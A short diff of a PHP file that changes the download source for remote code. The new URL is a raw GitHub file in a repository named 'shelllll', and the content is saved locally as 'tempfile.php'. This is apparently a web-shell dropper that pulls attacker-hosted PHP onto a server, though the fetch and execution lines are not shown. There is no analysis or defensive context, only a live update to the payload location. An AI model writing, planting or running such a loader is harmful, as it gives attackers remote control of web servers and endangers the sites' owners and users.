@@ -1,5 +1,5 @@
 <?php
-$remote_file = "https://raw.githubusercontent.com/okewlalocksystem-tech/BELAWAN/main/repository-matitanam.php.txt";
+$remote_file = "https://raw.githubusercontent.com/waklabu979/shelllll/refs/heads/main/bapet.txt";
 $local_file = "tempfile.php";
 
 // Ambil dari internet
